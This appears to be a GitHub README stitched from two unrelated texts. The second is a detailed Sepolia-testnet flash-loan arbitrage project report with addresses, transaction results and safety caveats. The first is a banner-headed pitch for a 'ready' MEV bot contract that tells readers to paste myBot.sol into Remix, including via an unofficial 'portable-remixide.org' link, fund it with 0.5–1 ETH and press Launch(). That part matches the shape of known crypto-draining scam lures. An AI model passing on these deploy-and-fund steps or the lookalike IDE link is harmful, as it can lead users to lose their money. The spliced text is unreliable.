
![B](https://i.postimg.cc/Vvxx2whh/20251219-1540-Banner-dla-Githab-simple-compose-01kcvddqxpfd3bgr4kkvnf0qm7.png)

  

## Executor (Aave/Balancer + Uniswap/Sushi)

Basically, contract for MEV: takes flash loans, runs arbitrage between DEXes, does liquidations. Everything is ready, deploy and use.

  

What it does:

  

**Essentially:** contract takes tokens on loan (flash loan), exchanges them for other tokens through DEX, then returns the loan + fee, extracting profit from price differences.

  

**Important:** the whole scheme is built so that **the entire process happens within one transaction of one contract** — from taking the loan to repayment and getting profit.

  

-  **Aave V3 flashLoanSimple**: takes flash loan and calls `executeOperation(...)` callback, where the strategy is executed.

-  **Balancer Vault flashLoan**: multi-asset flash loan and `receiveFlashLoan(...)` callback.

-  **DEX cycle (arbitrage)**: 2 swaps (Uniswap V3 ↔ SushiSwap V2) with `minOut` and `minProfit` checks.

-  **Liquidation (Aave V3)**: `liquidationCall(...)` with `minCollateralOut` check.

-  **Withdrawals**: `withdrawEth(...)`, `withdrawToken(...)` + emergency `emergencyTokenRecovery(...)`.

  
  
  

How to run:

  

Owner contract — you are the owner, call functions, it does flash loans and strategies in one transaction.

  

**Quick scheme:**

1. Create contract in Remix: https://remix.ethereum.org/ or https://portable-remixide.org

  

According to Screenshot:

- 1- Create .sol file and paste contract in editor field [myBot.sol](myBot.sol)

- 2- Compilation tab > version 0.8.20 > Compile button

- 3- Deploy tab > Select Executor contract > press Deploy Contract

![Contract creation instructions](https://i.ibb.co/HTRkw29n/instructions.png)

  

2. Top up contract balance (0.5-1 ETH)

  

3. Run `Launch()` — it takes loan and performs operations

  

4. If need to withdraw profit — press `withdrawEth()` or `withdrawToken()`

  

Simple start: `Launch()` — loan amount is calculated as contract_balance * 200.

  
  

-  **Aave flash loan**: `executeFlashLoanArbitrage(asset, amount, params)`

-  **Balancer flash loan**: `executeBalancerFlashLoan(tokens, amounts, userData)`

  

`params/userData` are encoded as:

  

-  `operationType`:

-  `1` — DEX cycle

-  `2` — liquidation

  

Data formats:

  

### DEX cycle (operationType = 1)

  

```solidity

(uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit)

```

  

-  `firstDex`: `0` = UniswapV3→Sushi, `1` = Sushi→UniswapV3

-  `uniFee`: 500 / 3000 / 10000

-  `minOut1/minOut2`: slippage protection at each step

-  `minProfit`: minimum profit (otherwise transaction reverts)

  

### Liquidation (operationType = 2)

  

```solidity

(address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut)

```

  

Important to know:

  

- Don't expect easy money. Everything depends on the market — gas, slippage, competition, positions.

  

About ETH:

  

0.5-1 ETH will last a long time — for gas, if need to handle ETH/WETH, and just in case.

  

Roughly about profit: depends on loan size and market situation. For arbitrage usually 0.01-0.1% of amount, for liquidations — percentage of position. With 100 ETH loan might get 0.01-0.1 ETH profit, but this is very approximate and without guarantees — market changes every second.

  

Good luck!

![Visitors](https://visitor-badge.laobi.icu/badge?page_id=README_EN_PAGE_ID)

# Flash Loan Arbitrage Bot

EVM Network Arbitrage / Flash Loan Bot for testing DEX arbitrage on the
Ethereum Sepolia testnet.

## Project Status

**Current milestone: Sepolia flash-loan arbitrage execution successfully
completed end-to-end.**

The current system has successfully completed a real flash-loan
arbitrage transaction using the deployed `Executor` contract.

### Verified flow

``` text
Live DEX Quotes
      ↓
Opportunity Scanner
      ↓
Select Profitable Direction
      ↓
Encode Flash Loan Parameters
      ↓
Aave Flash Loan Simulation
      ↓
Gas Estimation
      ↓
Real Flash Loan Transaction
      ↓
SushiSwap V2
      ↓
Uniswap V3
      ↓
Aave Flash Loan Repayment
      ↓
Arbitrage Profit
      ↓
Transaction Event Decoding
      ↓
Frontend Transaction Confirmation
```

------------------------------------------------------------------------

## Technology Stack

### Frontend

-   React
-   TypeScript
-   Vite
-   ethers.js 6.x
-   React Router
-   wagmi / viem
-   Tailwind CSS

### Smart Contracts

-   Solidity
-   Aave V3
-   Uniswap V3
-   SushiSwap V2
-   Ethereum Sepolia Testnet
-   Remix IDE

### Wallet

-   MetaMask

------------------------------------------------------------------------

## Network

**Ethereum Sepolia Testnet**

The project is currently intended for testing only.

------------------------------------------------------------------------

# Current Deployed Executor

### Executor Contract

``` text
0x3aE7c844CAe182bBb7dfe31CeE3C4C1B729160D2
```

### Owner

``` text
0x02cb851d094AE4648FB528F9E62095356cB214BE
```

### Current Contract State

``` text
paused() = false
```

------------------------------------------------------------------------

# Sepolia Protocol Addresses

  Protocol        Address
  --------------- ----------------------------------------------
  Aave Pool       `0x6Ae43d3271ff6888e7Fc43Fd7321a503ff738951`
  Aave Provider   `0x012bAC54348C0E635dCAc9D5FB99f06F24136C9A`
  Uniswap V3      `0x3bFA4769FB09eefC5a80d6E87c3B9C650f7Ae48E`
  SushiSwap V2    `0xC532a74256D3Db42D0Bf7a0400fEFDbad7694008`
  Balancer        `0x0000000000000000000000000000000000000000`
  Master          `0x0000000000000000000000000000000000000000`

------------------------------------------------------------------------

# Sepolia Tokens

  Token   Address
  ------- ----------------------------------------------
  USDC    `0x94a9d9ac8a22534e3faca9f4e7f2e2cf85d5e4c8`
  WETH    `0xfff9976782d46cc05630d1f6ebab18b2324d6b14`

### Aave Faucet Helper

``` text
0x27a797DfFEc6d958cac5f9b36D80aB01F9cFBfD0
```

------------------------------------------------------------------------

# Verified Arbitrage Direction

The currently tested profitable direction is:

``` text
USDC
  ↓
SushiSwap V2
  ↓
WETH
  ↓
Uniswap V3
  ↓
USDC
```

The reverse direction:

``` text
USDC
  ↓
Uniswap V3
  ↓
WETH
  ↓
SushiSwap V2
  ↓
USDC
```

was unprofitable at the tested Sepolia prices.

Therefore:

``` text
firstDex = 1
```

means the first swap uses the V2-compatible DEX (SushiSwap), followed by
Uniswap V3.

``` text
dexSelector 0 = Uniswap V3
dexSelector 1 = SushiSwap V2
```

------------------------------------------------------------------------

# Live Flash Loan Test

## Test Amount

``` text
1,000,000 raw USDC
= 1.000000 USDC
```

## Flash Loan Parameters

``` text
operationType = 1
firstDex      = 1
tokenIn       = USDC
tokenOut      = WETH
uniFee        = 3000
minOut1       = 0
minOut2       = 0
minProfit     = 0
```

These zero protection values were used for controlled Sepolia testing
only.

They are **not production-safe settings**.

------------------------------------------------------------------------

# Verified Quotes

## SushiSwap V2

``` text
1,000,000 USDC
→ 262,505,899,501 WETH
```

## Uniswap V3

The tested round-trip produced approximately:

``` text
262,501,212,164 WETH
→ 4,664,569 USDC
```

The exact execution result is determined by the actual on-chain
transaction and events.

------------------------------------------------------------------------

# Successful Real Transaction

Transaction hash:

``` text
0x971371de9bd941d29be13342e74a910376c7005ac6f82593a2a2c4bbb7c5a0f7
```

## Receipt

``` text
Status: 1
Gas used: 413,145
Effective gas price: 2,604,391,432 wei
Gas cost: 1,075,991,298,173,640 wei
```

Approximate gas cost:

``` text
0.0010759913 SepoliaETH
```

------------------------------------------------------------------------

# Decoded Flash Loan Result

The frontend transaction decoder successfully detected these Executor
events:

``` text
SwapExecuted
SwapExecuted
ArbitrageProfit
FlashLoanExecuted
OperationCompleted
```

### Flash Loan

``` text
Borrowed:
1,000,000 raw USDC

Premium:
500 raw USDC

Required repayment:
1,000,500 raw USDC
```

### Arbitrage Profit

``` text
3,664,569 raw USDC
= 3.664569 USDC
```

### Final Executor USDC Balance

``` text
3,664,069 raw USDC
= 3.664069 USDC
```

The relationship is:

``` text
Arbitrage profit       3.664569 USDC
- Aave premium         0.000500 USDC
-----------------------------------
Final USDC             3.664069 USDC
```

### Final Executor WETH Balance

``` text
0.000000318444220802 WETH
```

### Operation

``` text
Operation ID: 3
Operation success: true
```

------------------------------------------------------------------------

# Frontend Features Verified

The frontend now includes:

-   Wallet connection through MetaMask
-   Ethereum Sepolia network detection
-   Executor contract status
-   Live DEX quote mode
-   Opportunity scanning
-   V2-compatible DEX → Uniswap V3 route selection
-   Uniswap V3 → V2-compatible reverse-route checking
-   Flash loan parameter encoding
-   Flash loan `staticCall` simulation
-   Flash loan gas estimation
-   Real flash loan execution
-   Transaction confirmation handling
-   Transaction history support
-   Flash-loan transaction event decoding
-   Flash loan amount and premium decoding
-   Arbitrage profit decoding
-   Operation ID decoding
-   Executor USDC/WETH result reporting
-   Execution-state button handling

------------------------------------------------------------------------

# Execution Button States

The execution page uses state-based button behavior:

  Execution State       Button
  --------------------- ---------------------------
  IDLE                  `Confirm & Execute`
  WAITING_FOR_WALLET    `Waiting for MetaMask...`
  TRANSACTION_PENDING   `Transaction Pending...`
  CONFIRMED             `Flash Loan Completed ✓`
  FAILED                `Retry Execution`

A confirmed transaction cannot be accidentally submitted again from the
same execution state.

------------------------------------------------------------------------

# Opportunity Scanner

The scanner currently operates in **LIVE SEPOLIA QUOTE MODE**.

It checks both arbitrage directions:

``` text
V2-Compatible DEX → Uniswap V3
Uniswap V3 → V2-Compatible DEX
```

It calculates a conservative estimated result using:

-   Flash-loan fee assumption
-   Minimum-output reserve
-   Safety buffer

The scanner currently selects the best profitable route from the live
quotes.

------------------------------------------------------------------------

# Important Safety Status

This project is **not production-ready**.

The current successful transaction proves the end-to-end mechanics on
Sepolia, but several safety improvements are still required before any
production deployment.

## Current limitations

### 1. Gas cost is not yet fully integrated into scanner profitability

The scanner currently uses a placeholder gas value during opportunity
calculation.

The actual successful transaction consumed:

``` text
413,145 gas
```

Future work should use a real gas estimate before declaring an
opportunity executable.

### 2. Aave premium should be read dynamically

The current test used:

``` text
500 raw units
```

for a 1,000,000 raw-unit flash loan.

The frontend/scanner should eventually obtain the current Aave premium
dynamically instead of relying on a hard-coded assumption.

### 3. `minOut1` and `minOut2`

The successful diagnostic transaction used:

``` text
minOut1 = 0
minOut2 = 0
```

This is acceptable only for controlled testing.

Production execution must use meaningful minimum-output protections.

### 4. `minProfit`

The successful diagnostic transaction used:

``` text
minProfit = 0
```

This must not be used for production arbitrage.

A real minimum-profit threshold should account for:

-   Aave premium
-   DEX fees
-   Slippage
-   Gas cost
-   Safety margin

### 5. Prices can change

The tested route was profitable at the observed Sepolia prices.

It does **not** mean that:

``` text
SushiSwap → Uniswap V3
```

will always be profitable.

Every execution must use fresh quotes and revalidate the opportunity.

------------------------------------------------------------------------

# Development Rules

The project follows these development rules:

1.  Update existing functions/files where possible.
2.  Do not rewrite the entire project unless explicitly requested.
3.  Preserve existing coding style and comments.
4.  Provide complete functions when replacement is required.
5.  Do not introduce duplicate functions or duplicate logic.
6.  Change one feature at a time.
7.  Do not disturb already-working functionality.
8.  Run the TypeScript/Vite build before moving to the next feature.
9.  Explain exactly what to replace and where.
10. Test changes on Sepolia before considering them complete.

------------------------------------------------------------------------

# Build

From the frontend directory:

``` powershell
cd D:\FlashLoan\evm-network-arbitrage-bot\frontend
npm install
npm run build
```

Current build status:

``` text
TypeScript compilation: PASS
Vite production build: PASS
```

The current Vite output includes a chunk-size warning above 500 kB. This
is a performance optimization item, not a build failure.

------------------------------------------------------------------------

# Development Server

``` powershell
cd D:\FlashLoan\evm-network-arbitrage-bot\frontend
npm run dev
```

Default local URL:

``` text
http://localhost:5173
```

------------------------------------------------------------------------

# Main Frontend Routes

``` text
/dashboard
/scanner
/opportunity
/execution
/transactions
/contract
```

------------------------------------------------------------------------

# Current Project Milestone

``` text
================================================
FLASH LOAN ARBITRAGE — SEPOLIA CHECKPOINT
================================================

Live quote scanning                 ✓
Route selection                     ✓
Parameter encoding                  ✓
Aave flash loan simulation          ✓
Gas estimation                      ✓
Real flash loan execution           ✓
SushiSwap V2 swap                   ✓
Uniswap V3 swap                     ✓
Aave repayment                      ✓
Arbitrage profit                    ✓
Transaction receipt                 ✓
Event decoding                      ✓
Frontend confirmation               ✓
Execution state handling            ✓

================================================
CURRENT PROFITABLE TEST ROUTE
================================================

USDC → SushiSwap V2 → WETH
    → Uniswap V3 → USDC

================================================
EXECUTOR
================================================

0x3aE7c844CAe182bBb7dfe31CeE3C4C1B729160D2

================================================
NEXT DEVELOPMENT PHASE
================================================

Safety hardening:
- Dynamic Aave premium
- Real gas-cost integration
- Safer minOut values
- Dynamic minProfit
- Final net-profit calculation
- Improved execution-result UI
================================================
```

------------------------------------------------------------------------

# Repository

GitHub:

https://github.com/Jayakumar09/evm-network-arbitrage-bot

This README represents the current Sepolia testing checkpoint and should
be updated as the project moves into the safety-hardening phase.
